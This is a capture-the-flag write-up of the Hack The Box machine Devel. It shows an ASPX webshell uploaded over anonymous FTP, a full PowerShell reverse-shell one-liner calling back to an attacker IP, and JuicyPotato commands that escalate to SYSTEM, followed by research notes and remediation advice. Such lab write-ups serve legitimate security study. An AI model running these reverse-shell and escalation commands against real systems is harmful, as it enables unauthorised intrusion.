# Devel — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🪟 Windows 7 Enterprise (Build 7600, RTM/no SP) |
| **Difficulty** | 🟢 Easy (official) |
| **Owned** | 19/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`<Redacted>`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Devel** exposes anonymous, write-enabled FTP straight into the IIS webroot. Dropping an ASPX
webshell over FTP and hitting it over HTTP gives code execution as the IIS service account, which
holds `SeImpersonatePrivilege` — abused here with **JuicyPotato** (COM/DCOM NTLM-reflection token
impersonation) rather than the official writeup's Metasploit-only `ms10_015_kitrap0d` kernel
exploit.

**Attack path:** `Anonymous FTP (write) → ASPX webshell in IIS webroot → SeImpersonatePrivilege abuse (JuicyPotato) → SYSTEM`

---

## 🔍 1. Reconnaissance

### Port scan

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```

UDP: no open ports.

### Service/version scan

```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%)
```

---

## 🧭 2. Enumeration

- **FTP (21):** anonymous login allowed, and the listed directory (`aspnet_client`,
  `iisstart.htm`, `welcome.png`) matches IIS's default webroot layout — meaning this FTP account
  isn't just readable, it's rooted at `C:\inetpub\wwwroot`.
- **HTTP (80):** default IIS7 landing page, confirming the FTP root and the web root are the same
  directory — so anything written over FTP is immediately reachable and executable over HTTP.

---

## 🎯 3. Foothold

**1) Confirm anonymous FTP has write access to the IIS webroot**, then upload an ASPX webshell
(command exec + file browser/upload) over that FTP connection.

**2) Browse to the uploaded `.aspx` page over HTTP** and execute commands through it:

```
whoami /all

USER INFORMATION
----------------
User Name       SID
=============== ==============================================================
iis apppool\web S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

**3) Upgrade to an interactive reverse shell** through the webshell's command box (PowerShell TCP
client, base64-encoded to sidestep quoting issues in the shell's single command-box input):

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.121',1339);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Key finding carried into privesc: `SeImpersonatePrivilege` **Enabled** on the IIS service account
— the whole next stage depends on this.

---

## ⬆️ 4. Privilege Escalation — IIS Service Account → SYSTEM (JuicyPotato)

**Technique:** `SeImpersonatePrivilege` abuse via JuicyPotato (MITRE [T1134.001](https://attack.mitre.org/techniques/T1134/001/) — Token Impersonation).

### Tool selection logic

| Observation | Consequence |
|---|---|
| `combase.dll` absent (Win7 predates it) | GodPotato ruled out — errors `[!] No combase module found` |
| OS = Win7 Build 7600 | JuicyPotato viable (unpatched DCOM/COM NTLM-reflection chain) |
| x86 OS (checked via `dir C:\Windows\Microsoft.NET\Framework` — no `Framework64`) | Needed the **x86** JuicyPotato build; x64 gave "not compatible with this version of Windows" |
| Win7 Enterprise | Use the `Windows_7_Enterprise` CLSID list |

### Exploit

**Tool:** [JuicyPotato (x86)](https://github.com/ohpe/juicy-potato)
**CLSID lists:** [ohpe/juicy-potato/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
**CLSID used:** `{4991d34b-80a1-4291-83b6-3328366b9097}` (BITS — runs as LocalSystem, present on nearly all Windows builds)

### Execution flow

```bash
# 1. Listener on attack box (port must match payload)
nc -lvnp 1340
```

```bash
# 2. Generate base64 PowerShell reverse shell (encoding sidesteps webshell quoting problems)
echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.15.121",1340); ... $client.Close()' | iconv -t UTF-16LE | base64 -w0
```

```cmd
:: 3. Drop payload to a .bat on target via webshell (file-based -p more reliable than inline -a)
echo powershell -nop -w hidden -enc <BASE64> ^> C:\temp\r.bat
type C:\temp\r.bat
```

```cmd
:: 4. Fire JuicyPotato at the bat
C:\temp\Juicy.Potato.x86.exe -l 4444 -c {4991d34b-80a1-4291-83b6-3328366b9097} -p C:\temp\r.bat -t *
```

```
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
```

**5.** SYSTEM shell lands on the 1340 listener.

### Flag reference

- `-l 4444` — JuicyPotato local COM port (loopback, victim-side plumbing — **not** the reverse shell port)
- `-c` — CLSID of the privileged DCOM object to bait
- `-p` / `-a` — program/args launched as SYSTEM (the payload)
- `-t *` — try both `CreateProcessWithTokenW` and `CreateProcessAsUser`
- The reverse-shell port lives **inside** the payload and dials the `nc` listener separately from `-l`

### Gotchas hit (worth keeping)

- **`No combase module found`** → GodPotato needs `combase.dll`, absent pre-Win8; switch to JuicyPotato.
- **"not compatible with this version of Windows"** → binary/OS architecture mismatch; confirm with `wmic os get osarchitecture` before picking a build.
- **`recv failed with error: 10038`** → invalid/placeholder CLSID; supply a real OS-specific one via `-c`.
- **Reverse shell never connects** → double-check the port baked into the payload actually matches the listener (hit here: 1339 vs 1340 mismatch cost real troubleshooting time).

---

## 🚩 Proof

```
PS C:\temp> whoami
nt authority\system

PS C:\Users> type babis\Desktop\user.txt
<Redacted>
PS C:\Users> type Administrator\Desktop\root.txt
<Redacted>
```

```
user.txt (babis):          <Redacted>
root.txt (Administrator):  <Redacted>
```

---

## 🔬 Research notes

Two questions from the working notes, researched with a gather-then-verify pass (method in
`.claude/skills/vault-research/references/`) — only claims confirmed by trusted sources are kept.

### What is `ms10_015_kitrap0d`, and how does it differ from the JuicyPotato path used here?

`exploit/windows/local/ms10_015_kitrap0d` is a Metasploit **local** privilege-escalation module
implementing the KiTrap0D exploit (originally by Tavis Ormandy) for **CVE-2010-0232 / MS10-015**.

**Root cause (confirmed against two independent trusted sources — NVD-derived CVE detail and
Rapid7's own vulnerability database entry, which agree):** the flaw is in how the Windows kernel's
**NTVDM (NT Virtual DOS Machine)** subsystem — the 16-bit-application compatibility layer on
32-bit Windows — validates BIOS calls. A local attacker crafts a malicious `VDM_TIB` structure in
the Thread Environment Block, calls `NtVdmControl` to start NTVDM, and triggers an improperly
handled exception in the **`#GP` trap handler (`nt!KiTrap0D`)**, which can be abused to replace the
calling process's token with the SYSTEM token.

> One low-trust AI-generated search summary encountered during Step 1 claimed KiTrap0D "exploits a
> vulnerability in the Windows Task Scheduler." Two independent trusted sources (NVD/CVE detail
> aggregation and Rapid7's own CVE database) directly contradict this — the bug is in NTVDM/the
> `#GP` trap handler, nothing to do with Task Scheduler. Discarded per the verification step; a
> concrete example of why Step 2 exists.

**Preconditions:** local code execution as a non-elevated user, **x86 only** (relies on
`kitrap0d.x86.dll`, no x64 support), Windows 2000 SP4 through Windows 7. It won't run at all if the
session is already elevated.

**How it differs from the JuicyPotato path actually used on Devel:**

| | KiTrap0D (`ms10_015_kitrap0d`) | JuicyPotato (used here) |
|---|---|---|
| **Bug class** | Genuine kernel memory/exception-handling vulnerability (CVE-2010-0232) | Abuse of an intentional Windows *privilege* (`SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`) combined with DCOM activation + NTLM reflection — not a memory-safety bug |
| **Patch status** | Fixed once-and-for-all by MS10-015 (Jan 2010); gone on any patched box regardless of privileges held | Not "patchable" the same way — Microsoft mitigated the specific DCOM/NTLM-reflection trick starting Windows 10 1809/Server 2019, which spawned successor tools (RoguePotato, PrintSpoofer, GodPotato) that work around each new mitigation |
| **Requirement** | Unpatched x86 kernel; works regardless of which privileges the current token holds | Requires the *account* to already hold `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` (common for IIS app-pool/service accounts by design) |
| **Relevance today** | Windows XP/2000/7-era only, long patched — mostly historical/OSCP-legacy-box knowledge | The underlying privilege-abuse pattern (Potato-family attacks) is still current OSCP-relevant knowledge, just against newer mitigations |

In short: the official writeup's route is a one-shot kernel exploit tied to a single 2010 patch;
the manual route taken here is a still-living class of privilege-design abuse that keeps
resurfacing in new "Potato" variants as Microsoft patches each specific mitigation.

**Sources:**
- [Rapid7 — `ms10_015_kitrap0d` module reference](https://www.rapid7.com/db/modules/exploit/windows/local/ms10_015_kitrap0d/)
- [Rapid7 — CVE-2010-0232 vulnerability database entry](https://www.rapid7.com/db/vulnerabilities/cve-2010-0232/)
- [CVE-2010-0232 detail aggregation](https://www.cvedetails.com/cve/CVE-2010-0232/)
- [ohpe/juicy-potato — maintainer's own README](https://github.com/ohpe/juicy-potato)
- [MITRE ATT&CK T1134.001 — Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)

### Is it OK to use an LLM to help research during OSCP study?

Worth separating **practice/study** from **the actual proctored exam** — OffSec's policy differs
sharply between the two:

- **During the live OSCP+ exam:** OffSec's own AI Usage Policy **strictly prohibits** using LLMs
  or AI chatbots (their own KAI assistant included, plus ChatGPT/Gemini/etc.) — it's treated as
  third-party assistance and a violation of their Academic Policy. (Only the OSEE/OSAI exams
  currently carve out an exception.)
- **During practice/labs on retired machines (like this repo):** that policy is titled — and
  scoped to — OffSec **exams** specifically; nothing in it restricts how you study beforehand. The
  common, sensible standard (matching how this repo already treats this) is: use an LLM as a
  *research aid* to explain unfamiliar concepts or point at sources, same as this file's own
  research-notes sections — but make sure you understand the technique well enough to reproduce it
  yourself without it, since that's what the actual exam will demand.

> ⚠️ Partial verification note: OffSec's official policy page
> (`help.offsec.com/.../AI-Usage-Policy-in-OffSec-Exams`) returned an access error when fetched
> directly during this research; the summary above is corroborated via its indexed content rather
> than a direct page load. The core distinction (exam-time prohibition vs. no stated restriction
> on practice) is consistent across every source found and matches OffSec's exam-guide framing, but
> flagging the fetch limitation for transparency.

**Sources:**
- [OffSec Support Portal — AI Usage Policy in OffSec Exams](https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams)
- [OffSec Support Portal — OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

## 🧠 Lessons Learned

- **What worked:** anonymous-write FTP straight into an IIS webroot is a full foothold by itself —
  always test FTP write access, not just read, when anonymous login is allowed.
- **Rabbit holes:** chasing a manual (non-Metasploit) privesc path cost real time — an unstable
  webshell-driven reverse shell made iterating on JuicyPotato's CLSID/payload slower than it should
  have been, and picking the wrong Potato variant for the OS (GodPotato needs `combase.dll`, absent
  on Win7) wasted a round trip.
- **Personal take (not universal fact):** the author's own view is that Devel is harder than its
  official "Easy" rating suggests **if you deliberately avoid Metasploit** for privesc — the
  official path is a single `ms10_015_kitrap0d` module run, while the manual JuicyPotato route
  demanded correct OS/arch/CLSID diagnosis and a less forgiving shell. Recorded here as a personal
  assessment and study-philosophy note (leaning toward manual technique over Metasploit
  "shortcuts"), not as a claim that overrides HTB's own difficulty rating.
- **OSCP takeaway:** `SeImpersonatePrivilege` on a service account is one of the highest-value
  enumeration findings on any Windows web-app foothold — check `whoami /priv` immediately, and pick
  the Potato variant that actually matches the target's OS/DCOM-mitigation level rather than
  reaching for whichever one is newest.

---

## 🛡️ Remediation

| Finding | Severity | Fix |
|---------|:--------:|-----|
| Anonymous FTP with write access to the IIS webroot | Critical | Disable anonymous FTP write, or disable anonymous FTP entirely; never share FTP root with the web server's document root |
| `SeImpersonatePrivilege` held by the IIS service account | High | Run app pools with the minimum privilege needed; apply Windows updates mitigating DCOM/NTLM-reflection token-impersonation abuse (Windows 10 1809+/Server 2019+ behavior) |
| Unpatched Windows 7 (Build 7600 RTM, no service pack) | Critical | Patch/upgrade — an unsupported, unpatched OS is vulnerable to numerous kernel LPEs beyond just this chain |

---

## 🔗 References

- [ohpe/juicy-potato — README](https://github.com/ohpe/juicy-potato)
- [MITRE ATT&CK T1134.001 — Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)
- [Rapid7 — `ms10_015_kitrap0d` module reference](https://www.rapid7.com/db/modules/exploit/windows/local/ms10_015_kitrap0d/)
- [Rapid7 — CVE-2010-0232 vulnerability database entry](https://www.rapid7.com/db/vulnerabilities/cve-2010-0232/)
- [OffSec Support Portal — AI Usage Policy in OffSec Exams](https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams)
